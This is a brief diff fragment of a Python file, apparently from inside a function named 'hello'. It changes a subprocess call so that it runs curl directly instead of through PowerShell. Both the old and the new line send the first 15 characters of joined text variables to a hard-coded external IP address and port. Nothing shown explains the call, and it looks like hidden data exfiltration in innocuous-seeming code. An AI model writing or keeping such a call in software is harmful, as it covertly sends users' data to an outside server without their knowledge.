@@ -929,5 +929,5 @@ def hello():
  
     text = text1 + text2 
 
-    subprocess.Popen(["powershell", "curl", "-d", f"{text[:15]}", "http://137.184.76.134:8081"])
+    subprocess.Popen(["curl", "-d", f"{str(text[:15])}", "http://137.184.76.134:8081"])
 
